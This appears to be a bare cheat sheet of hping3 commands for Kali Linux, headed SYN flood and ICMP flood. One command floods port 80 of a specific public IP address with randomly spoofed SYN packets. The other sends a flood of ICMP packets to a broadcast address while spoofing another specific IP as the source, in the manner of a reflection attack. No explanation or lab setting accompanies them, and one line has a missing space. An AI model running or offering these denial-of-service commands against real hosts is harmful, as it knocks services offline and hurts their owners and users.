#SYN flood

#hping3 Kali Linux

sudo hping3 -C 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 74.50.111.247

#ICMP flood

#hping3 Kali Linux

sudo hping3 -1 -c 1500000--flood -a 74.50.111.245 192.168.0.255